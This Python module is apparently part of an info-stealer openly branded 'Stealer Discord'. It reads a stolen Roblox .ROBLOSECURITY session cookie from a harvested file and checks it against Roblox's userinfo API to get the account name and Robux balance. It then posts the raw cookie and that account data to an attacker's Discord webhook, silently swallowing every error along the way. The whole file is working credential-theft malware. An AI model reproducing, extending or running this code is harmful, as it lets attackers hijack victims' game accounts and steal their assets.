import requests, os

def robloxinfo(webhook: str, path: str):
        try:
            with open(os.path.join(path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
                robo_cookie = f.read().strip()
                if robo_cookie == "No Roblox Cookies Found":
                    pass
                else:
                    headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                    info = None
                    try:
                        response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
                        response.raise_for_status()
                        info = response.json()
                    except requests.exceptions.HTTPError:
                        pass
                    except requests.exceptions.RequestException:
                        pass
                    if info is not None:
                        data = {
                            "embeds": [
                                {
                                    "title": "Roblox Info",
                                    "color": 5639644,
                                    "fields": [
                                        {
                                            "name": "<:roblox_icon:1041819334969937931> Name:",
                                            "value": f"`{info['UserName']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": "<:robux_coin:1041813572407283842> Robux:",
                                            "value": f"`{info['RobuxBalance']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": "🍪 Cookie:",
                                            "value": f"`{robo_cookie}`"
                                        }
                                    ],
                                    "thumbnail": {
                                        "url": info['ThumbnailUrl']
                                    },
                                    "footer": {
                                        "text": "Stealer Discord | Created By yashing2 and VMS_SHOP and phantoms_._"
                                    },
                                }
                            ],
                            "username": "🌸 Stealer Discord 🌸",
                            "avatar_url": "https://github.com/yashing2/StealerDiscord/blob/main/OIG3.S8.png?raw=true",
                        }
                        requests.post(webhook, json=data)
        except: 
            pass